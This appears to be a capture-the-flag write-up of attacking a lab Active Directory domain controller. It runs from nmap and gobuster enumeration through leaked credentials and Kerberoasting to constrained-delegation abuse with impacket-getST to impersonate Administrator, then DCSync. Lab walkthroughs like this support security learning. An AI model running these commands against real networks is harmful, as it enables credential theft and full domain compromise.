Started with a nmap scan
```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-11-19 23:56:19Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 126
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: COOCTUS
|   NetBIOS_Domain_Name: COOCTUS
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: COOCTUS.CORP
|   DNS_Computer_Name: DC.COOCTUS.CORP
|   Product_Version: 10.0.17763
|_  System_Time: 2025-11-19T23:57:14+00:00
|_ssl-date: 2025-11-19T23:57:30+00:00; +56s from scanner time.
| ssl-cert: Subject: commonName=DC.COOCTUS.CORP
| Issuer: commonName=DC.COOCTUS.CORP
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-18T23:20:46
| Not valid after:  2026-05-20T23:20:46
| MD5:   596d:1933:54b2:ff08:a5e6:00d1:4cb7:a912
| SHA-1: fc74:6abe:8fff:9a97:7e5d:5d67:de04:3a22:d063:4457
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
47001/tcp open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49668/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49700/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49706/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49712/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
50607/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
Domain `COOCTUS.CORP` Hostname `DC` 

Starting with the webhost going to the site it says it got hacked im going to run a gobuster scan while it enumerate the rest of the ports 
Checking out the SMB and LDAP the guest account and null session account is disabled.
Checking out the DNS for any easy subdomains and got nothing.
The gobuster scan came back
```
/robots.txt
/backdoor.php
/db-config.bak
```
going to the `robots` file it shows another file we can maybe hit `db-config.bak` and this file has some creds in it `C00ctusAdm1n:B4dt0th3b0n3` when we go to the `backdoor.php` file we cant use it since we don't know any of the commands and these creds dont work for anything so were at a dead end now checking out the RDP looks like there is a sticky note on the desktop screen using `rdesktop` we can read the full screen `rdesktop -u '' 10.201.53.111 -f` and we can see the full sticky note and it says `Visitor:GuestLogin!` when trying this as a login it says `only admins have access` and these are creds that work for SMB I also got kerbrute running in the background to see what users we can find and with these creds we can confirm the users with the `--users` option on netexec
```
david
steve
mark
kevin
jeff
howard
David
ben
karen
evan
administrator
jon
Jeff
Jon
Ben
spooks
fawaz
visitor
pars
Guest
krbtgt
admCroccCrew
cryillic
yumeko
Varg
password-reset
```
and there is a interesting account `admCroccCrew` its the answer to question 2 and these creds for the Visitor account can also access the `Home` folder in SMB and get the flag for question 1 but we cant do much so lets see if we can get any user spn's using impacket `impacket-getuserspns cooctus.corp/Visitor:GuestLogin! -dc-ip 10.64.176.183 -request` and we get the hash for the `password-reset` account and we can crack it with hashcat and now we have creds `password-reset:resetpassword` and we can run `ldapdomaindump` since we cant run bloodhound and this user has `trusted_to_auth_for_delegation` but we need the right spn and we can use `impacket-finddelegation` tool and see that we can use `oakley` and now we can get a ticket for the admin account `impacket-getST -spn oakley/DC.cooctus.corp -impersonate Administrator "cooctus.corp/password-reset:resetpassword" -dc-ip 10.64.176.183` and then we can dcsync to get the admin hash 